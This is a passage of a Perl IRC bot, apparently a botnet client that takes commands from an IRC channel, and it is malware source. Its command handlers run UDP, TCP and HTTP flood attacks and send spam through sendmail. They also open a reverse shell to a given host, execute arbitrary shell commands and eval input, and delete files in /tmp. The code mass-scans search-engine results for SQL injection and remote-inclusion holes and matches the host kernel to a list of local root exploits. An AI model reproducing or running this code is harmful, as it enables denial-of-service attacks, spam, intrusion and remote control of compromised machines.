if ($funcarg =~ /^autoscan\s+(.*)\s+http\:\/\/(.*?)\/(.*?)\s+(\d+)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (my $d=fork()) {
addproc($d,"[String] $2");
exit;
} else {
      $kto = $1;
      $host = $2;
      $skrypt = $3;
      $czekac=$4;

      #http://ttl.ugu.pl/string/index.php
      my $socke = IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>"80",Proto=>"tcp") or return;
      print $socke "GET /$skrypt HTTP/1.0\r\nHost: $host\r\nAunixept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";

      my @r = <$socke>;
      $page="@r";

      $page =~ s/!scan(\s+)//g;
      $page =~ s/!scan(.)//g;
      $page =~ s/\<.*\>//g;

      @lines = split (/\n/, $page);
      $ile=scalar(@lines);


      for($i=9;$i<=$ile;$i+=4) {

         for($j=0;$j<4;$j++) {
            #print $lines[$i+$j]."\n";

            sendraw($IRC_cur_socket, "PRIVMSG $printl :$kto $lines[$i+$j]");

            sleep 10;
         }

         sleep $czekac*60;
      }

   }
      delproc($$);
      exit;
   }
}





#######  SQL SCANNER  #########

if ($funcarg =~ /^sql\s+(.*)\s+(\d+)/){
   if (my $pid = fork()) {
      waitpid($pid, 0);
   } else {
      if (my $d=fork()) {
         addproc($d,"[SQL1] $1 $2");
         exit;
      } else {
         my $site=$1;
         my $columns=$2;
         sendraw($IRC_cur_socket, "PRIVMSG $printl :6 [ sql ] [ Sprawdzam: $site cols:  $columns ] ");

         $w=int rand(999);
         $w=$w*1000;
         for($i=1;$i<=$columns;$i++) {
            splice(@col,0,$#col+1);
            for($j=1;$j<=$i;$j++) {
               push(@col,$w+$j);
            }
            $tmp=join(",",@col);
            $test=$site.$bug."-1+UNION+SELECT+".$tmp."/*";
                        #$result=query($test);
            $result=get_html($test);

            $result =~ s/\/\*\*\///g;
            $result =~ s/UNION([^(\*)]*)//g;
            for($k=1;$k<=$i;$k++) {
               $n=$w+$k;
                  if($result =~ /$n/){
                     splice(@col2,0,$#col2+1);
                        for($s=1;$s<=$i;$s++) {
                           push(@col2,$s);
                        }
                     $tmp2=join(",",@col2);
                     $test2="+UNION+SELECT+".$tmp2."/*";
                     push @{$dane{$test2}},$k;
                  }
            }
         }
         for $klucz (keys %dane) {
            foreach $i(@{$dane{$klucz}}) {
               $klucz =~ s/$i/$i/;
            }
            sendraw($IRC_cur_socket, "PRIVMSG $printl :3 [ vuln ]  [  ".$site.$bug."-1".$klucz."  ]  ");
         }
         sendraw($IRC_cur_socket, "PRIVMSG $printl :6 [ sql ] [ Koniec  ] ");
      }
   delproc($$);
   exit;
   }
}
#######  SQL SCANNER  #########
######################
#        unixable                                     #
######################
if ($funcarg =~ /^unixable/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@unixable]::::... Nah tho ");
}
if ($funcarg =~ /^unixme/) {
my $khost = `uname -r`;
my $currentid = `whoami`;
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@unixable] Currently you are ".$currentid." ");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@unixable] The kernel of this shell is ".$khost." ");
chomp($khost);

   my %h;
   $h{'w00t'} = {
      vuln=>['2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','2.4.20']
   };

   $h{'brk'} = {
      vuln=>['2.4.22','2.4.21','2.4.10','2.4.20']
   };

   $h{'ave'} = {
      vuln=>['2.4.19','2.4.20']
   };

   $h{'elflbl'} = {
      vuln=>['2.4.29']
   };

   $h{'elfdump'} = {
      vuln=>['2.4.27']
   };

   $h{'expand_stack'} = {
      vuln=>['2.4.29']
   };

   $h{'h00lyshit'} = {
      vuln=>['2.6.8','2.6.10','2.6.11','2.6.9','2.6.7','2.6.13','2.6.14','2.6.15','2.6.16','2.6.2']
   };

   $h{'kdump'} = {
      vuln=>['2.6.13']
   };

   $h{'km2'} = {
      vuln=>['2.4.18','2.4.22']
   };

   $h{'krad'} = {
      vuln=>['2.6.11']
   };

   $h{'krad3'} = {
      vuln=>['2.6.11','2.6.9']
   };

   $h{'local26'} = {
      vuln=>['2.6.13']
   };

   $h{'loko'} = {
      vuln=>['2.4.22','2.4.23','2.4.24']
   };

   $h{'mremap_pte'} = {
      vuln=>['2.4.20','2.2.25','2.4.24']
   };

   $h{'newlocal'} = {
      vuln=>['2.4.17','2.4.19','2.4.18']
   };

   $h{'ong_bak'} = {
      vuln=>['2.4.','2.6.']
   };

   $h{'ptrace'} = {
      vuln=>['2.2.','2.4.22']
   };

   $h{'ptrace_kmod'} = {
      vuln=>['2.4.2']
   };

   $h{'ptrace24'} = {
      vuln=>['2.4.9']
   };

   $h{'pwned'} = {
      vuln=>['2.4.','2.6.']
   };

   $h{'py2'} = {
      vuln=>['2.6.9','2.6.17','2.6.15','2.6.13']
   };

   $h{'raptor_prctl'} = {
      vuln=>['2.6.13','2.6.17','2.6.16','2.6.13']
   };

   $h{'prctl3'} = {
      vuln=>['2.6.13','2.6.17','2.6.9']
   };

   $h{'remap'} = {
      vuln=>['2.4.']
   };

   $h{'rip'} = {
      vuln=>['2.2.']
   };

   $h{'stackgrow2'} = {
      vuln=>['2.4.29','2.6.10']
   };

   $h{'uselib24'} = {
      vuln=>['2.4.29','2.6.10','2.4.22','2.4.25']
   };

   $h{'newsmp'} = {
      vuln=>['2.6.']
   };

   $h{'smpracer'} = {
      vuln=>['2.4.29']
   };

   $h{'loginx'} = {
      vuln=>['2.4.22']
   };

   $h{'exp.sh'} = {
      vuln=>['2.6.9','2.6.10','2.6.16','2.6.13']
   };

   $h{'prctl'} = {
      vuln=>['2.6.']
   };

   $h{'kmdx'} = {
      vuln=>['2.6.','2.4.']
   };

   $h{'raptor'} = {
      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16']
   };

   $h{'raptor2'} = {
      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16']
   };

foreach my $key(keys %h){
foreach my $kernel ( @{ $h{$key}{'vuln'} } ){
   if($khost=~/^$kernel/){
   chop($kernel) if ($kernel=~/.$/);
   sendraw($IRC_cur_socket, "PRIVMSG $printl :[@unixable] Possible Local unix Exploits: ". $key ." ");
      }
   }
}
}
######################
#       MAILER       #
######################
if ($funcarg =~ /^sendmail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Mailer]  Mailer :. |  Sending Mail to : 2 $3");
$subject = $1;
$sender = $2;
$recipient = $3;
@corpo = $4;
$mailtype = "content-type: text/html";
$sendmail = '/usr/sbin/sendmail';
open (SENDMAIL, "| $sendmail -t");
print SENDMAIL "$mailtype\n";
print SENDMAIL "Subject: $subject\n";
print SENDMAIL "From: $sender\n";
print SENDMAIL "To: $recipient\n\n";
print SENDMAIL "@corpo\n\n";
close (SENDMAIL);
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Mailer]   Mailer :. |  Mail Sent To : 2 $recipient");
}
######################
#   End of MAILER    #
######################
# A /tmp cleaner

if ($funcarg =~ /^cleartmp/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@TMPCleaner] /tmp is Cleaned");
}
if ($funcarg =~ /^no/) {
    system 'cd /tmp;rm -rf *';
         sendraw($IRC_cur_socket, "PRIVMSG $printl :[@TMPCleaner] /tmp is Cleaned");
         }
#-#-#-#-#-#-#-#-#
# Flooders IRC  #
#-#-#-#-#-#-#-#-#
# msg, @msgflood <who>
if ($funcarg =~ /^msgflood (.+?) (.*)/) {
   for($i=0; $i<=10; $i+=1){
      sendraw($IRC_cur_socket, "PRIVMSG ".$1." ".$2);
   }
      sendraw($IRC_cur_socket, "PRIVMSG $printl :[@MSGFlood]4 Excecuted on ".$1." ");
}

# dunixflood, @dunixflood <who>
if ($funcarg =~ /^dunixflood (.*)/) {
   for($i=0; $i<=10; $i+=1){
      sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001Dunix CHAT chat 1121485131 1024\001\n");
   }
      sendraw($IRC_cur_socket, "PRIVMSG $printl :[@DunixFlood]4 Excecuted on ".$1." ");
}
# ctcpflood, @ctcpflood <who>
if ($funcarg =~ /^ctcpflood (.*)/) {
   for($i=0; $i<=10; $i+=1){
      sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001VERSION\001\n");
      sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001PING\001\n");
   }
      sendraw($IRC_cur_socket, "PRIVMSG $printl :[@CTCPFlood]4 Excecuted on ".$1." ");
}
# noticeflood, @noticeflood <who>
   if ($funcarg =~ /^noticeflood (.*)/) {
      for($i=0; $i<=10; $i+=1){
         sendraw($IRC_cur_socket, "NOTICE ".$1." :w3tFL00D\n");
   }
      sendraw($IRC_cur_socket, "PRIVMSG $printl :[@NoticeFlood]4 Excecuted on ".$1." ");
}
# Channel Flood, @channelflood
if ($funcarg =~ /^channelflood/) {
   for($i=0; $i<=25; $i+=1){
      sendraw($IRC_cur_socket, "JOIN #".(int(rand(99999))) );
   }
      sendraw($IRC_cur_socket, "PRIVMSG $printl :[@ChannelFlood]4 Excecuted ");
}
# Maxi Flood, @maxiflood
if ($funcarg =~ /^maxiflood(.*)/) {
   for($i=0; $i<=15; $i+=1){
         sendraw($IRC_cur_socket, "NOTICE ".$1." :Iyzan_Loves_you,_;)\n");
         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001VERSION\001\n");
         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001PING\001\n");
         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :Iyzan_Loves_you,_;\n");
   }
      sendraw($IRC_cur_socket, "PRIVMSG $printl :[@M4Xi-Fl00d]4 Excecuted on ".$1." ");
}
######################
#  irc    #
######################
         if ($funcarg =~ /^reset/) {
            sendraw($IRC_cur_socket, "QUIT :");
         }
         if ($funcarg =~ /^join (.*)/) {
            sendraw($IRC_cur_socket, "JOIN ".$1);
         }
         if ($funcarg =~ /^part (.*)/) {
            sendraw($IRC_cur_socket, "PART ".$1);
         }
         if ($funcarg =~ /^voice (.*)/) {
            sendraw($IRC_cur_socket, "MODE $printl +v ".$1);
           }
         if ($funcarg =~ /^devoice (.*)/) {
            sendraw($IRC_cur_socket, "MODE $printl -v ".$1);
           }
         if ($funcarg =~ /^halfop (.*)/) {
            sendraw($IRC_cur_socket, "MODE $printl +h ".$1);
           }
         if ($funcarg =~ /^dehalfop (.*)/) {
            sendraw($IRC_cur_socket, "MODE $printl -h ".$1);
           }
         if ($funcarg =~ /^owner (.*)/) {
            sendraw($IRC_cur_socket, "MODE $printl +q ".$1);
           }
         if ($funcarg =~ /^deowner (.*)/) {
            sendraw($IRC_cur_socket, "MODE $printl -q ".$1);
         }
         if ($funcarg =~ /^op (.*)/) {
            sendraw($IRC_cur_socket, "MODE $printl +o ".$1);
           }
         if ($funcarg =~ /^deop (.*)/) {
            sendraw($IRC_cur_socket, "MODE $printl -o ".$1);
           }
######################
#End of Join And Part#
######################

######################
#     UDPFlood       #
######################
if ($funcarg =~ /^udp\s+(.*)\s+(\d+)\s+(\d+)/) {
           sendraw($IRC_cur_socket, "PRIVMSG $printl :3[@UDP-DDOS3] Attacking  ".$1.":".$2." 3for  ".$3." 3seconds.");
           $iaddr = inet_aton("$1") or die "Fuck wrong ip";
           $endtime = time() + ($3 ? $3 : 1000000);
           socket(flood, PF_INET, SOCK_DGRAM, 17);
           $port = "80";
           for (;time() <= $endtime;) {
           $2 = $2 ? $2 : int(rand(1024-64)+64) ;
           $port = $port ? $port : int(rand(65500))+1;
           send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($2, $iaddr));}
           sendraw($IRC_cur_socket,"PRIVMSG $printl :3[@UDP-DDOS3] Attack done  ".$1.":".$2.".");
  }
######################
#     TCPFlood       #
######################

         if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@TCP-DDOS] Attacking  ".$1.":".$2." for  ".$3." seconds.");
            my $itime = time;
            my ($cur_time);
            $cur_time = time - $itime;
            while ($3>$cur_time){
               $cur_time = time - $itime;
               &tcpflooder("$1","$2","$3");
            }
            sendraw($IRC_cur_socket,"PRIVMSG $printl :[@TCP-DDOS] Attack done  ".$1.":".$2.".");
         }
######################
#  End of TCPFlood   #
######################
######################
#               SQL Fl00dEr                     #
######################
if ($funcarg =~ /^sqlflood\s+(.*)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-DDOS] Attacking  ".$1."  on port 3306 for  ".$2."  seconds .");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
   my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>3306);
   print $socket "GET / HTTP/1.1\r\nAunixept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-DDOS] Attacking done  ".$1.".");
}
######################
#   Back Connect     #

######################
         if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
         sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Back-Connect]:::...  I don't know, I'm watching a show tho");

         }
         if ($funcarg =~ /^shhcon\s+(.*)\s+(\d+)/) {
            my $host = "$1";
            my $porta = "$2";
            my $proto = getprotobyname('tcp');
            my $iaddr = inet_aton($host);
            my $paddr = sockaddr_in($porta, $iaddr);
            my $shell = "/bin/sh -i";
            if ($^O eq "MSWin32") {
               $shell = "cmd.exe";
            }
            socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
            connect(SOCKET, $paddr) or die "connect: $!";
            open(STDIN, ">&SOCKET");
            open(STDOUT, ">&SOCKET");
            open(STDERR, ">&SOCKET");
            system("$shell");
            close(STDIN);
            close(STDOUT);
            close(STDERR);
            if ($estatisticas){
               sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Back-Connect] Connecting to  $host:$porta");
            }
         }
######################
#End of  Back Connect#
######################
######################
#    MULTI SCANNER   #
######################
if ($funcarg =~ /^multiscan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
                  my ($type,$space);
                  my %hosts;
                  ### Start Message
                  sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] Starting Scan for $bug $dork");
                  sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] Initializing on 5 Search Engines ");
                  ### End of Start Message
# Starting Google
   my @glist=&google($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl [@Multi-Scan] Google [".scalar(@glist)."] Sites");
   my @mlist=&msn($dork);
   my @asklist=&ask($dork);
   my @allist=&alltheweb($dork);
   my @aollist=&aol($dork);
   my @lycos=&lycos($dork);
   my @ylist=&yahoo($dork);
   my @mzlist=&mozbot($dork);
   my @mamalist&mamma($dork);
   my @hlist=&hotbot($dork);
   my @altlist=&altavista($dork);
   my @slist=&search($dork);
   my @ulist=&uol($dork);
   my @fireball=&fireball($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] Google [".scalar(@glist)."] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] MSN [".scalar(@mlist)."] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] AllTheWeb [".scalar(@allist)."] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] Ask.com [".scalar(@asklist)."] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] AOL [".scalar(@aollist)."] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] Lycos [".scalar(@lycos)."] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] Yahoo! [".scalar(@ylist)."] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] MozBot [".scalar(@mzlist)."] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] Mama [".scalar(@mamalist)."] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] HotBot [".scalar(@hlist)."] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] Altavista [".scalar(@altlist)."] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] Search[dot]com [".scalar(@slist)."] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] UoL [".scalar(@ulist)."] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Multi-Scan] FireBall [".scalar(@flist)."] Sites");
#
push(my @tot, @glist, @mlist, @alist, @allist, @asklist, @aollist, @lycos, @ylist, @mzlist, @mamalist, @hlist,@altlist, @slist, @ulist, @flist );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl [@Multi-Scan]  Results: Total:[".scalar(@tot)."] Sites and Cleaned: [".scalar(@puliti)."] for $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl [@Multi-Scan] Exploiting  [".$contatore."]  of  [".$uni. "] Sites");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl [@Multi-Scan] Finished for  $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(4);
my $response=$ua->request($req);
if ($response->is_suunixess) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl [@Multi-Scan]  Safe Mode = OFF :. | Vuln:  $print ");
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl [@Multi-Scan]  Safe Mode =  ON :. | Vuln:  $print  ");
}}
}}}
exit;
}}}
######################
#End of MultiSCANNER #
######################
######################
#     HTTPFlood      #
######################
         if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:HTTP DDoS:.| Attacking  ".$1."  on port 80 for  ".$2."  seconds .");
            my $itime = time;
            my ($cur_time);
            $cur_time = time - $itime;
            while ($2>$cur_time){
               $cur_time = time - $itime;
               my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
               print $socket "GET / HTTP/1.1\r\nAunixept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
               close($socket);
            }
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:HTTP DDoS:.| Attacking done  ".$1.".");
         }
######################
#  End of HTTPFlood  #
######################
######################
#     UDPFlood       #
######################
         if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:UDP DDoS:.| Attacking  ".$1."  with  ".$2."  Kb Packets for  ".$3."  seconds.");
            my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
            $dtime = 1 if $dtime == 0;
            my %bytes;
            $bytes{igmp} = $2 * $pacotes{igmp};
            $bytes{icmp} = $2 * $pacotes{icmp};
            $bytes{o} = $2 * $pacotes{o};
            $bytes{udp} = $2 * $pacotes{udp};
            $bytes{tcp} = $2 * $pacotes{tcp};
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@UDP-DDos] Results ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb in ".$dtime." seconds to ".$1.".");
         }
######################
#  End of Udpflood   #
######################
         exit;
      }
   }

sub ircase {
   my ($kem, $printl, $case) = @_;
   if ($case =~ /^join (.*)/) {
      j("$1");
   }
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
   if ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
         for (my $ca = 1; $ca <= $1; $ca++ ) {
            p("$2");
            j("$2");
         }
      } else {
         p("$chan");
         j("$chan");
      }
   }

   if ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }

   if ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }

   if ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }

   if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
         msg("$2", "$3");
      }
   }

   if ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }

   if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
         ctcp("$2", "$3");
      }
   }

   if ($case =~ /^nick (.*)/) {
      nick("$1");
   }

   if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
      conectar("$2", "$1", 6667);
   }

   if ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }

   if ($case =~ /^eval (.*)/) {
      eval "$1";
   }
}

sub get_html() {
$test=$_[0];

      $ip=$_[1];
      $port=$_[2];

my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
if(defined($ip) && defined($port)) {
      $ua->proxy("http","http://$ip:$port/");
      $ua->agent("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
}
$ua->timeout(1);
my $response=$ua->request($req);
if ($response->is_suunixess) {
   $re=$response->content;
}
return $re;
}

sub addproc {

   my $proc=$_[0];
   my $dork=$_[1];

   open(FILE,">>/var/tmp/pids");
   print FILE $proc." [".$irc_servers{$IRC_cur_socket}{'nick'}."] $dork\n";
   close(FILE);
}


sub delproc {

   my $proc=$_[0];
   open(FILE,"/var/tmp/pids");

   while(<FILE>) {
      $_ =~ /(\d+)\s+(.*)/;
      $childs{$1}=$2;
   }
   close(FILE);
   delete($childs{$proc});

   open(FILE,">/var/tmp/pids");

   for $klucz (keys %childs) {
      print FILE $klucz." ".$childs{$klucz}."\n";
   }
}

sub shell {
   my $printl=$_[0];
   my $comando=$_[1];
   if ($comando =~ /cd (.*)/) {
      chdir("$1") || msg("$printl", "No such file or directory");
      return;
   } elsif ($pid = fork) {
      waitpid($pid, 0);
   } else {
      if (fork) {
         exit;
      } else {
         my @resp=`$comando 2>&1 3>&1`;
         my $c=0;
         foreach my $linha (@resp) {
            $c++;
            chop $linha;
            sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
            if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
            }
         }
         exit;
      }
   }
}

sub tcpflooder {
   my $itime = time;
   my ($cur_time);
   my ($ia,$pa,$proto,$j,$l,$t);
   $ia=inet_aton($_[0]);
   $pa=sockaddr_in($_[1],$ia);
   $ftime=$_[2];
   $proto=getprotobyname('tcp');
   $j=0;$l=0;
   $cur_time = time - $itime;
   while ($l<1000){
      $cur_time = time - $itime;
      last if $cur_time >= $ftime;
      $t="SOCK$l";
      socket($t,PF_INET,SOCK_STREAM,$proto);
      connect($t,$pa)||$j--;
      $j++;
      $l++;
   }
   $l=0;
   while ($l<1000){
      $cur_time = time - $itime;
      last if $cur_time >= $ftime;
      $t="SOCK$l";
      shutdown($t,2);
      $l++;
   }
}

sub udpflooder {
   my $iaddr = inet_aton($_[0]);
   my $msg = 'A' x $_[1];
   my $ftime = $_[2];
   my $cp = 0;
   my (%pacotes);
   $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
   socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
   socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
   socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
   socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
   return(undef) if $cp == 4;
   my $itime = time;
   my ($cur_time);
   while ( 1 ) {
      for (my $porta = 1; $porta <= 65000; $porta++) {
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
         send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
         send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
         send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
         for (my $pc = 3; $pc <= 255;$pc++) {
            next if $pc == 6;
            $cur_time = time - $itime;
            last if $cur_time >= $ftime;
            socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
            send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
         }
      }
      last if $cur_time >= $ftime;
   }
   return($cur_time, %pacotes);
}

sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}

sub j {
   &join(@_);
}

sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}

sub p {
   part(@_);
}

sub part {
   sendraw("PART $_[0]");
}

sub nick {
   return unless $#_ == 0;
   sendraw("NICK $_[0]");
}

sub quit {
   sendraw("QUIT :$_[0]");
}

sub fetch(){
   my $rnd=(int(rand(9999)));
   my $n= 80;
   if ($rnd<5000) {
      $n<<=1;
   }
   my $s= (int(rand(10)) * $n);
   my @dominios = ("removed-them-all");
   my @str;
   foreach $dom  (@dominios){
      push (@str,"@gstring");
   }
   my $query="www.google.com/search?q=";
   $query.=$str[(rand(scalar(@str)))];
   $query.="&num=$n&start=$s";
   my @lst=();
   sendraw("privmsg #debug :DEBUG only test googling: ".$query."");
   my $page = http_query($query);
   while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"? class=l>/g){
      if ($1 !~ m/google|cache|translate/){
         push (@lst,$1);
      }
   }
   return (@lst);

sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=100){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $msn=("http://search.msn.de/results.aspx?q=".key($key)."&first=".$b."&FORM=PORE");
my $Res=query($msn);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub lycos(){
my $inizio=0;
my $pagine=20;
my $key=$_[0];
my $av=0;
my @lst;
while($inizio <= $pagine){
my $lycos="http://search.lycos.com/?query=".key($key)."&page=$av";
my $Res=query($lycos);
while ($Res=~ m/<span class=\"?grnLnk small\"?>http:\/\/(.+?)\//g ){
my $k="$1";
my @grep=links($k);
push(@lst,@grep);
}
$inizio++;
$av++;
}
return @lst;
}

#####
sub aol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $AoL=("http://search.aol.com/aol/search?query=".key($key)."&page=".$b."&nt=null&ie=UTF-8");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}
#####

#####
sub alltheweb()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub google(){
my @lst;
my $key = $_[0];
for($b=0;$b<=100;$b+=100){
my $Go=("http://www.google.it/search?hl=it&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS SEARCH
#####
sub search(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $ser=("http://www.search.com/search?q=".key($key)."".$b);
my $Res=query($ser);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS FireBall
#####
sub fireball(){
my $key=$_[0];
my $inicio=1;
my $pagina=200;
my @lst;
my $av=0;
